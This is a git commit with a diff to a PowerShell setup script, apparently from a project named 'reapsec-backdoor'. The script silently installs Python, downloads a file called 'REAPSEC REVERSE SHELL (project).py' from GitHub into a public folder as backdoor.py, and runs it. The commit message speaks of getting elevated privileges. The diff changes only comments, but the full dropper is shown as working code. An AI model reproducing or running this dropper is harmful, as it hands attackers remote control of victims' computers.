8bc1d9ab29f9ec6b66a43c063bf49f4d9fbba037
ternall <143479753+ternall@users.noreply.github.com>
2024-08-07 20:56:06 -0700

    Update setup.ps1
    stupid privileges stupid admin... stupid admin privilege stupid powerhsell.
    gives the script elevated permissions.

--- setup.ps1
+++ setup.ps1
@@ -1,10 +1,10 @@
-# is python installed
+# python blah blah blah
 if (-Not (Get-Command python -ErrorAction SilentlyContinue)) {
     Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.9.13/python-3.9.13-amd64.exe' -OutFile 'C:\Users\Public\python-installer.exe'
     Start-Process 'C:\Users\Public\python-installer.exe' -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1' -Wait
     Remove-Item -Path 'C:\Users\Public\python-installer.exe'
 }
 
-# download python
+# download it if its not there
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ternall/reapsec-backdoor/main/REAPSEC%20REVERSE%20SHELL%20(project).py' -OutFile 'C:\Users\Public\backdoor.py'
 Start-Process python 'C:\Users\Public\backdoor.py'
